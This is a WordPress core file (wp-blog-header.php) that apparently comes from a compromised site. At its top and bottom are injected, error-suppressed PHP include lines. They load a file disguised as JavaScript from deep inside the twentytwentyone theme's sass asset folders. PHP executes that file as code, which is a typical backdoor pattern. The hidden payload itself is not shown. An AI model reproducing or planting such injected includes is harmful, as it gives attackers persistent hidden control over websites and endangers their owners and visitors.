<?php
@include "wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-posts/include/1359.js";
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}

@include "wp-content/themes/twentytwentyone/assets/sass/05-blocks/latest-posts/include/1359.js";